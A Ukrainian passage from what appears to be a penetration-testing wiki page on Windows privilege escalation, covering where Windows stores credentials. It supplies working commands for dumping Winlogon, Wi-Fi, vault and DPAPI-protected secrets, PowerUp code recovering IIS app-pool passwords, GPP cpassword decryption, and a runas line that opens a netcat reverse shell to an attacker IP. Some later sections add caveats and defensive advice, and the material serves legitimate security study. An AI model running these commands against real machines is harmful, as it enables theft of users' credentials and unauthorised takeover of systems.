Ви можете переглянути файлову систему `WSL` у папці `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`

Наявність прав `root` у Linux усередині WSL сама по собі не надає прав адміністратора Windows. Якщо поточний обліковий запис Windows може читати файлову систему дистрибутива, перевірте файли історії команд оболонки (зокрема `/root/.bash_history`) на наявність команд, у яких могли зберегтися облікові дані; для підвищення привілеїв усе одно потрібен дійсний обліковий запис із вищими привілеями та дозволений спосіб автентифікації. Структура `LocalState\rootfs` використовується в старіших інсталяціях WSL; у WSL 2 дистрибутив зазвичай зберігається у [віртуальному диску `ext4.vhdx`](https://learn.microsoft.com/en-us/windows/wsl/disk-space), тому спершу визначте фактичний дистрибутив і шлях до його сховища. Уникайте виведення вмісту історії команд під час автоматизованого переліку.

## Облікові дані Windows

### Облікові дані Winlogon

```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```

Вважайте `DefaultUserName` і `DefaultDomainName` контекстом облікового запису, а не обліковими даними. Непорожнє значення `DefaultPassword` або `AltDefaultPassword` — це знахідка plaintext у реєстрі. Якщо `AutoAdminLogon=1`, але пароль у відкритому вигляді не читається, це лише зачіпка: [Sysinternals Autologon може зберігати пароль як секрет LSA](https://learn.microsoft.com/en-us/sysinternals/downloads/autologon), а звичайне читання реєстру не дає змоги встановити, чи існує цей секрет і чи можна його отримати. Перш ніж повідомляти про витік облікових даних, перевірте права доступу та фактичну конфігурацію входу.

### Диспетчер облікових даних / Windows vault

З [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)<sup>[[34]](#references)</sup>\
Windows Vault зберігає облікові дані для серверів, вебсайтів та інших програм, які **Windows** може використовувати, щоб **автоматично входити в облікові записи користувачів**. Спочатку може здатися, що користувачі можуть зберігати облікові дані для таких сайтів, як Facebook, Twitter або Gmail, і автоматично входити в них через браузери, але це працює інакше.

Windows Vault зберігає облікові дані, за допомогою яких Windows може автоматично входити в облікові записи користувачів. Це означає, що будь-яка **програма Windows, якій потрібні облікові дані для доступу до ресурсу** (сервера або вебсайту), **може скористатися цим Credential Manager і Windows Vault** та використовувати надані облікові дані, замість того щоб щоразу просити користувачів вводити ім’я користувача й пароль.

Якщо програми не взаємодіють із Credential Manager, я не думаю, що вони можуть використовувати облікові дані для певного ресурсу. Тож якщо ваша програма хоче скористатися сховищем, вона має певним чином **взаємодіяти з диспетчером облікових даних і запитувати облікові дані для цього ресурсу** зі сховища за замовчуванням.

Використовуйте `cmdkey`, щоб переглянути список збережених на комп’ютері облікових даних.

```bash
cmdkey /list
Currently stored credentials:
 Target: Domain:interactive=WORKGROUP\Administrator
 Type: Domain Password
 User: WORKGROUP\Administrator
```

Потім можна використовувати `runas` з параметром `/savecred`, щоб скористатися збереженими обліковими даними. У наведеному прикладі віддалений виконуваний файл запускається через SMB-ресурс.

```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```

Використання `runas` із наданими обліковими даними.

```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```

Зверніть увагу на mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html) або модуль [Empire Powershells](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1).

### UWP PasswordVault / Credential Locker

Сучасні програми Windows UWP, Microsoft Edge і сучасні системні служби зберігають токени автентифікації та паролі у відкритому вигляді в `PasswordVault` платформи Universal Windows Platform (UWP) (у `vaultcmd` він також відображається як `Web Credentials`). Це сховище ізольоване в межах сеансу; його вміст можна розшифрувати штатними засобами без прав адміністратора чи `SeDebugPrivilege`.

Виконайте цю команду PowerShell в активному сеансі користувача, щоб миттєво отримати й розшифрувати всі збережені імена користувачів і паролі у відкритому вигляді:

```ps1
[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]; $v = New-Object Windows.Security.Credentials.PasswordVault; $v.RetrieveAll() | ForEach-Object { try { $_.RetrievePassword(); $_ } catch {} } | Select-Object Resource, UserName, Password | Format-List
```

### DPAPI

**Інтерфейс програмування застосунків захисту даних (Data Protection API, DPAPI)** надає метод симетричного шифрування даних, який переважно використовується в операційній системі Windows для симетричного шифрування асиметричних приватних ключів. Для шифрування використовується секрет користувача або системи, що значно підвищує ентропію.

**DPAPI дає змогу шифрувати ключі за допомогою симетричного ключа, похідного від секретів входу користувача**. У сценаріях із системним шифруванням використовуються секрети доменної автентифікації системи.

Зашифровані RSA-ключі користувача, створені за допомогою DPAPI, зберігаються в каталозі `%APPDATA%\Microsoft\Protect\{SID}`, де `{SID}` — це [ідентифікатор безпеки](https://en.wikipedia.org/wiki/Security_Identifier) користувача. **Ключ DPAPI, який зберігається поруч із головним ключем, що захищає приватні ключі користувача в тому самому файлі**, зазвичай складається з 64 байтів випадкових даних. (Важливо зазначити, що доступ до цього каталогу обмежений, тому його вміст не можна переглянути за допомогою команди `dir` у CMD, але це можна зробити через PowerShell).

```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```

Ви можете скористатися **модулем mimikatz** `dpapi::masterkey` із відповідними аргументами (`/pvk` або `/rpc`), щоб розшифрувати його.

**Файли облікових даних, захищені головним паролем**, зазвичай розташовані тут:

```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```

You can use **mimikatz module** `dpapi::cred` with the appropriate `/masterkey` to decrypt.\
You can **extract many DPAPI** **masterkeys** from **memory** with the `sekurlsa::dpapi` module (if you are root).


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### Облікові дані PowerShell

**Облікові дані PowerShell** часто використовуються для **сценаріїв** та завдань автоматизації як зручний спосіб зберігання зашифрованих облікових даних. Вони захищені за допомогою **DPAPI**, що зазвичай означає, що їх можна розшифрувати лише тим самим користувачем на тому самому комп’ютері, де їх було створено.

Експортований файл облікових даних може мати довільну назву або шлях `.xml`. Якщо сценарій або перелік файлів вказує на такий файл, визначте фактичний каталог профілю облікового запису, а не припускайте, що це `C:\Users`: [Windows може розміщувати профілі в інших місцях](https://learn.microsoft.com/en-us/windows/win32/shell/profiles-directory). Файл, який можна прочитати, — це лише зачіпка; [Windows `Export-Clixml` прив’язує зашифровані облікові дані до користувача та комп’ютера, які виконали експорт](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/export-clixml), а будь-який відновлений обліковий запис має окремо мати дійсні права на потрібну службу. Спершу перевірте шляхи та ACL, не виводячи зашифровані або відкриті значення під час звичайного переліку.

Щоб **розшифрувати** облікові дані PS із файлу, у якому вони містяться, можна виконати:

```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```

### Wifi

```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```

### Збережені RDP-підключення

Їх можна знайти в `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers`\
і в `HKCU\Software\Microsoft\Terminal Server Client\Servers`

### Нещодавно виконані команди

```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```

### **Диспетчер облікових даних віддаленого робочого стола**

```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```

Використовуйте модуль Mimikatz `dpapi::rdg` з відповідним `/masterkey`, щоб **розшифрувати будь-які файли .rdg**\
За допомогою модуля Mimikatz `sekurlsa::dpapi` можна **витягти з пам’яті багато DPAPI masterkeys**

**mRemoteNG використовує інше сховище підключень.** Перевірте XML-файли, доступні для читання, у `%APPDATA%\mRemoteNG` і в папці Documents користувача, зокрема файли зі звичайними назвами, як-от `config.xml`. Перш ніж вважати XML-файл потенційним джерелом облікових даних, визначте схему підключень і зашифровані атрибути `Password`. Збережене значення — це не пароль DPAPI/RDCMan; можливість відновлення залежить від налаштувань шифрування файлу та від того, чи використовувався власний master password. Під час широкого перебирання не виводьте зашифровані значення.

**Експорти профілів Remote Desktop Plus** також можуть бути доступні для читання в каталогах користувачів або спільній папці адміністрування. У застарілому експорті `profiles.xml` є записи `Data/Profile` з елементами `ProfileName`, `Password` і `Secure`. Вважайте непорожній елемент password потенційним джерелом облікових даних, але не виводьте його та не припускайте, що він містить відкритий текст: [у примітках постачальника](https://www.donkz.nl/) зазначено, що захист профілю може бути прив’язаний до облікового запису й комп’ютера, на яких його створили, або налаштований менш суворо. Перш ніж покладатися на такий файл, перевірте його походження та умови відновлення.

### Sticky Notes

Користувачі часто застосовують програму StickyNotes на робочих станціях Windows, щоб **зберігати паролі** та іншу інформацію, не усвідомлюючи, що це файл бази даних. Цей файл розташований за адресою `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite`; його завжди варто пошукати й перевірити.

Іноді користувачі зберігають паролі та іншу інформацію в програмах для нотаток. Упакована програма Sticky Notes від Microsoft зазвичай зберігає нотатки за адресою `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite`; старіші або інші програми можуть використовувати інші сховища в профілі користувача, зокрема LevelDB. Перш ніж вважати, що нотаток немає через відсутність файла SQLite, визначте встановлену програму та формат сховища.

Якщо Sticky Notes використовує журналювання SQLite із випереджальним записом (WAL), окрема копія `plum.sqlite` може не містити останніх зафіксованих нотаток. Зберігайте відповідний `plum.sqlite-wal` разом із узгодженою копією бази даних і, якщо доступний, додайте `plum.sqlite-shm`; індекс спільної пам’яті можна перебудувати, але WAL є частиною постійного стану бази даних. Див. [документацію SQLite щодо WAL](https://www.sqlite.org/wal.html). Нотатка з назвою облікового запису або паролем — лише потенційне джерело облікових даних: окремо перевірте обліковий запис, дозволений доступ і повторне використання пароля. Для запису із зашифрованим паролем у менеджері паролів також потрібні фактичний ключ розшифрування та інтерпретація, специфічна для програми, перш ніж він зможе підтвердити можливість входу з вищими привілеями.

### AppCmd.exe

**Зверніть увагу: щоб відновити паролі з AppCmd.exe, потрібно мати права адміністратора та запускати його з рівнем High Integrity.**\
**AppCmd.exe** розташований у каталозі `%systemroot%\system32\inetsrv\`.\
Якщо цей файл існує, можливо, було налаштовано певні **облікові дані**, які можна **відновити**.

Цей код узято з [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):

```bash
function Get-ApplicationHost {
    $OrigError = $ErrorActionPreference
    $ErrorActionPreference = "SilentlyContinue"

    # Check if appcmd.exe exists
    if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
        # Create data table to house results
        $DataTable = New-Object System.Data.DataTable

        # Create and name columns in the data table
        $Null = $DataTable.Columns.Add("user")
        $Null = $DataTable.Columns.Add("pass")
        $Null = $DataTable.Columns.Add("type")
        $Null = $DataTable.Columns.Add("vdir")
        $Null = $DataTable.Columns.Add("apppool")

        # Get list of application pools
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

            # Get application pool name
            $PoolName = $_

            # Get username
            $PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
            $PoolUser = Invoke-Expression $PoolUserCmd

            # Get password
            $PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
            $PoolPassword = Invoke-Expression $PoolPasswordCmd

            # Check if credentials exists
            if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
            }
        }

        # Get list of virtual directories
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

            # Get Virtual Directory Name
            $VdirName = $_

            # Get username
            $VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
            $VdirUser = Invoke-Expression $VdirUserCmd

            # Get password
            $VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
            $VdirPassword = Invoke-Expression $VdirPasswordCmd

            # Check if credentials exists
            if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
            }
        }

        # Check if any passwords were found
        if( $DataTable.rows.Count -gt 0 ) {
            # Display results in list view that can feed into the pipeline
            $DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
        }
        else {
            # Status user
            Write-Verbose 'No application pool or virtual directory passwords were found.'
            $False
        }
    }
    else {
        Write-Verbose 'Appcmd.exe does not exist in the default location.'
        $False
    }
    $ErrorActionPreference = $OrigError
}
```

### SCClient / SCCM

Перевірте, чи існує `C:\Windows\CCM\SCClient.exe`.\
Інсталятори **запускаються з привілеями SYSTEM**, багато з них вразливі до **DLL Sideloading (інформація з** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**

```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```

## Файли та реєстр (облікові дані)

### Артефакти облікових даних у реєстрі засобів підтримки

У деяких старіших інсталяціях засобів віддаленої підтримки в реєстрі під фіксованими ключами програм зберігаються назви значень, пов’язані з паролями. Наприклад, у версіях TeamViewer до 9 включно `SecurityPasswordAES` позначав налаштований статичний пароль сеансу, згідно з [поясненням виробника щодо ключа реєстру](https://community.teamviewer.com/English/discussion/82264/specification-on-cve-2019-18988). Маркер у назві значення — лише підказка для перевірки: перш ніж оцінювати ці облікові дані, перевірте встановлену версію, доступність даних значення для читання, їхній формат і поточну поведінку автентифікації. Перехід від пароля засобу віддаленої підтримки до облікового запису Windows із вищими привілеями також потребує фактичного повторного використання пароля та наявності дозволу на цей обліковий запис. Не виводьте зашифровані дані та відновлені паролі під час звичайного переліку.

### Спільні електронні таблиці із захищеними аркушами

Якщо є підозра, що доступна для читання спільна книга містить дані облікових записів, розрізняйте **шифрування файлу** та захист аркуша чи приховані стовпці. [Microsoft зазначає](https://support.microsoft.com/en-us/excel/protection-and-security-in-excel), що захист аркуша обмежує редагування, але не є засобом безпеки; сам по собі він не підтверджує, що вміст книги зашифровано. Перевіряйте лише дозволені й релевантні файли та не виводьте можливі секрети під час широкого переліку. Доступний для читання шлях до `.xlsx`, захищений аркуш або прихований стовпець самі по собі не доводять наявності облікових даних чи вищих привілеїв будь-якого облікового запису; окремо перевірте фактичні дані та поточні права облікового запису.

### Збережені патчі змін на CI-сервері

CI-сервер може зберігати надіслані зміни коду у своєму каталозі даних навіть після завершення збірки. [TeamCity документує](https://www.jetbrains.com/help/teamcity/teamcity-data-directory.html) `system/changes` як місце зберігання змін для віддалених запусків; каталог даних можна налаштувати, і він не обов’язково розташований у `ProgramData`. Доступний для читання патч може зберегти видалені або додані посилання на файл облікових даних, ключ шифрування чи скрипт, що використовує і те, й інше. Наприклад, для робочого процесу PowerShell `ConvertTo-SecureString -Key` потрібен AES-ключ, а також зашифрований рядок; [Microsoft документує](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/convertfrom-securestring), що ключ передається окремо. Спочатку перегляньте лише доступні назви патчів, а потім, за наявності дозволу, перевірте релевантний вміст, не виводячи секрети під час звичайного переліку. Шлях до патча, зашифроване значення чи посилання на ключ самі по собі не доводять наявності дійсних облікових даних або доступу з вищими привілеями. Обмежте ACL каталогу даних і не додавайте секрети до змін збірки.

### Користувацька ротація паролів локального адміністратора

Саморобний засіб ротації паролів може зберігати зашифрований пароль локального адміністратора в локальній службі, а облікові дані для сховища даних — у доступному для читання файлі `.env` або поруч із виконуваним файлом програми оновлення. Перевіряйте разом заплановане завдання програми оновлення, обліковий запис, ACL конфігураційних файлів, прослуховувач і дозволи сховища даних. До сховища даних, доступного лише через loopback, усе одно може звернутися локальний користувач із дійсними обліковими даними, але сама автентифікація не доводить права на читання потрібних записів. Якщо поруч із зашифрованими даними доступні початкове значення шифрування або матеріал ключа, перевірте точний спосіб виведення ключа, перш ніж покладатися на шифрування. Схема, що детерміновано виводить AES-ключ із відкритого початкового значення за допомогою Go [`math/rand`](https://pkg.go.dev/math/rand), непридатна для захисту такого пароля; документація Go вказує, що цей пакет не призначений для випадкових даних, чутливих до безпеки. Перш ніж вважати відновлений пароль шляхом підвищення привілеїв, переконайтеся, що він актуальний і належить обліковому запису з групи локальних адміністраторів. Заплановане завдання, шлях до `.env` або зашифрований блок самі по собі не підтверджують жодної з цих умов. Не виводьте паролі й матеріал ключів під час звичайного переліку.

Для керування паролями локальних адміністраторів використовуйте [Windows LAPS](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-concepts-overview). Зберігання в каталозі або Entra та засоби керування доступом до них відрізняються від користувацького локального сховища даних; так само [ролі Elasticsearch](https://www.elastic.co/guide/en/elasticsearch/reference/current/authorization.html/) визначають, чи може автентифікований користувач сховища даних читати певний індекс.

### Архіви плагінів Java-сервера та повторне використання облікових даних

Деякі плагіни Java-серверів поширюються як JAR-архіви в каталозі сервера `plugins`. Доступний для читання користувацький плагін може містити конфігурацію або байткод із вбудованими обліковими даними служби. Перевіряйте архів лише за наявності дозволу та не виводьте відновлені секрети під час звичайного переліку. Сам шлях до плагіна не доводить наявності секрету, а відновлений пароль служби дає змогу отримати вищі привілеї лише тоді, коли він також дійсний для облікового запису з вищими привілеями. Перевірте відповідні ACL файлів і замініть повторно використані облікові дані на унікальні секрети. Див. [посібник PaperMC зі встановлення плагінів](https://docs.papermc.io/paper/adding-plugins/) щодо структури каталогів і [документацію Oracle про JAR](https://docs.oracle.com/javase/8/docs/technotes/guides/jar/index.html) щодо вмісту архівів.

### Облікові дані вбудованої бази даних Openfire

Інсталяція Openfire із вбудованою базою даних може зберігати `openfire.script` у `Openfire\embedded-db`. Якщо поточний обліковий запис може читати цей файл, перевірте записи `OFUSER` і властивість `passwordKey` разом. У [документації Openfire про постачальника облікових записів](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/openfire/user/DefaultUserProvider.html) зазначено, що паролі можуть зберігатися у відкритому вигляді або бути зашифрованими ключем, який міститься в цій властивості. Відновлений пароль має значення для підвищення привілеїв, лише якщо він досі дійсний для облікового запису з вищими привілеями; сама назва файлу не доводить ані доступу на читання, ані повторного використання облікових даних. Шлях — це лише орієнтир для інвентаризації, тому не виводьте вміст бази даних і облікові дані під час звичайного переліку.

Окремий файл `Openfire\conf\openfire.xml` може показати налаштовані порти та інтерфейс прив’язки консолі адміністратора, навіть якщо використовується зовнішня база даних. Зазвичай Openfire прив’язує консоль адміністратора до loopback; локальний обліковий запис усе одно може звернутися до цієї адреси, якщо прослуховувач запущений. Перевірте разом фактичний прослуховувач, дозволену роль адміністратора, політику завантаження плагінів і ідентичність служби Openfire. Адміністратор, який може встановлювати плагін, може запустити його код у контексті служби, що може мати високі привілеї, якщо служба працює від імені LocalSystem. Відповідний пароль облікового запису або доступний для читання шлях до конфігурації самі по собі не доводять доступу до консолі адміністратора чи виконання коду. Див. [посібник виробника зі встановлення та керування плагінами](https://download.igniterealtime.org/openfire/docs/latest/documentation/install-guide.html) і [властивість API завантаження плагінів](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/admin/servlet/PluginServlet.html).

### Конфігурація сервера керування цифровою криміналістикою

Конфігурації сервера Velociraptor, зазвичай із назвою `server.config.yaml`, можуть містити `CA.private_key` внутрішнього центру сертифікації. Якщо користувач із нижчими привілеями може читати цей ключ, він може мати змогу випустити клієнтський сертифікат API. Чи призведе це до вищих привілеїв, залежить від ролей користувачів на сервері, доступності API та ідентичності, від імені якої працює сервер або цільовий агент. Клієнтська конфігурація містить інші дані; її виявлення не підтверджує доступу до центру сертифікації сервера. У деяких розгортаннях приватний ключ центру сертифікації зберігають офлайн, тому доступна для читання конфігурація сервера також може не містити ключа підпису.

На сервері Windows перевірте ACL **серверної** конфігурації в каталозі інсталяції та будь-яких захищених резервних копій. Одне з можливих розташувань — `%ProgramFiles%\VelociraptorServer\server.config.yaml`; якщо налаштований шлях служби відрізняється, використовуйте його. Переконайтеся, що поточна ідентичність може читати файл і що `CA.private_key` справді присутній. Не виводьте приватний ключ у журнали чи результати переліку. Робочий процес виробника `config api_client` використовує ключ центру сертифікації для випуску клієнтського сертифіката, але також потрібна ефективна роль на сервері; її створення або зміна може вимагати доступу на запис до сховища даних або перезапуску. Наявна привілейована ідентичність на сервері може забезпечити шлях, навіть якщо такий запис недоступний. Запити API з правами на виконання запускаються в контексті відповідного сервера або агента, який може мати високі привілеї.

Захистіть конфігурацію сервера та резервні копії обмежувальними ACL, за можливості зберігайте ключ підпису центру сертифікації офлайн і обмежте ролі API та доступ до прослуховувача. Див. [документацію Velociraptor API](https://docs.velociraptor.app/docs/server_automation/server_api/) і [рекомендації щодо конфігурації безпеки](https://docs.velociraptor.app/docs/deployment/security/).

### Облікові дані PuTTY

```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```

Solar-PuTTY — це окремий менеджер сеансів. Його власне зашифроване сховище може міститися в `%APPDATA%\SolarWinds\FreeTools\Solar-PuTTY\data.dat`, а експортована резервна копія сеансів може називатися `sessions-backup.dat` і зберігатися в іншому місці. [Посібник SolarWinds з експорту](https://thwack.solarwinds.com/discussion/comment/115591) зазначає, що експортовані дані зашифровані паролем і можуть містити сеанси, ключі, скрипти, теги та зв’язки між ними; у [форумі підтримки](https://thwack.solarwinds.com/discussion/4520/saved-session-lost) вказано розташування власного сховища. Спершу перевірте дозволи на файли та шляхи. Виявлення будь-якого з цих файлів не розкриває його пароль і не доводить, що будь-які збережені облікові дані досі дійсні або мають вищі привілеї.

### Ключі SSH-хостів PuTTY

```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```

### SSH-ключі в реєстрі

Приватні SSH-ключі можуть зберігатися в розділі реєстру `HKCU\Software\OpenSSH\Agent\Keys`, тож перевірте, чи є там щось цікаве:

```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```

Якщо ви знайдете будь-який запис у цьому шляху, це, імовірно, буде збережений SSH-ключ. Він зберігається в зашифрованому вигляді, але його можна легко розшифрувати за допомогою [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract).\
Докладніше про цю техніку: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)<sup>[[37]](#references)</sup>

Якщо служба `ssh-agent` не запущена й ви хочете, щоб вона запускалася автоматично під час завантаження, виконайте:

```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```

> [!TIP]
> Схоже, цей метод більше не працює. Я спробував створити кілька ssh-ключів, додати їх за допомогою `ssh-add` і ввійти на машину через ssh. Розділу реєстру HKCU\Software\OpenSSH\Agent\Keys не існує, а procmon не виявив використання `dpapi.dll` під час автентифікації за асиметричним ключем.

### Файли автоматизованого встановлення

```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```

Також можна шукати ці файли за допомогою **metasploit**: _post/windows/gather/enum_unattend_

Приклад вмісту:

```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
    <AutoLogon>
     <Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
     <Enabled>true</Enabled>
     <Username>Administrateur</Username>
    </AutoLogon>

    <UserAccounts>
     <LocalAccounts>
      <LocalAccount wcm:action="add">
       <Password>*SENSITIVE*DATA*DELETED*</Password>
       <Group>administrators;users</Group>
       <Name>Administrateur</Name>
      </LocalAccount>
     </LocalAccounts>
    </UserAccounts>
```

### Резервні копії SAM і SYSTEM

```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```

Файли резервних копій Windows Imaging (`.wim`), які можна читати, також можуть містити автономні кущі реєстру `SAM`, `SECURITY` і `SYSTEM`. Насамперед перевіряйте локально доступні каталоги резервних копій або образів і переглядайте **назви елементів** образу, перш ніж щось видобувати; сама назва файла `.wim` не доводить, що він містить кущі реєстру, а типові `install.wim`, `boot.wim` і образи відновлення часто виявляються хибними зачіпками. Спільний ресурс SMB — це окремий шлях доступу; перевіряйте його, лише якщо він входить до меж перевірки. Див. [рекомендації Microsoft щодо образів Windows](https://learn.microsoft.com/en-us/windows-hardware/manufacture/desktop/work-with-windows-images) і [довідник файлів кущів реєстру](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-hives).

### Хмарні облікові дані

```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```

### McAfee SiteList.xml

Знайдіть файл із назвою **SiteList.xml**

### Кешований пароль GPP

Раніше була доступна функція, яка дозволяла розгортати власні локальні облікові записи адміністратора на групі комп’ютерів за допомогою Group Policy Preferences (GPP). Однак цей метод мав серйозні недоліки безпеки. По-перше, будь-який користувач домену міг отримати доступ до об’єктів групової політики (GPO), що зберігалися як XML-файли в SYSVOL. По-друге, будь-який автентифікований користувач міг розшифрувати паролі в цих GPP, зашифровані AES256 із використанням загальнодоступного стандартного ключа. Це становило серйозний ризик, оскільки могло дозволити користувачам отримати підвищені привілеї.

Щоб зменшити цей ризик, було розроблено функцію для пошуку локально кешованих файлів GPP, що містять непорожнє поле "cpassword". Знайшовши такий файл, функція розшифровує пароль і повертає власний об’єкт PowerShell. Цей об’єкт містить відомості про GPP і розташування файлу, допомагаючи виявити й усунути цю вразливість безпеки.

Шукайте ці файли в `C:\ProgramData\Microsoft\Group Policy\history` або в _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (до Windows Vista)_:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**Щоб розшифрувати cPassword:**

```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```

Використання crackmapexec для отримання паролів:

```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```

### Конфігурація вебсервера IIS

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
type C:\Windows\Microsoft.NET\Framework644.0.30319\Config\web.config | findstr connectionString
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

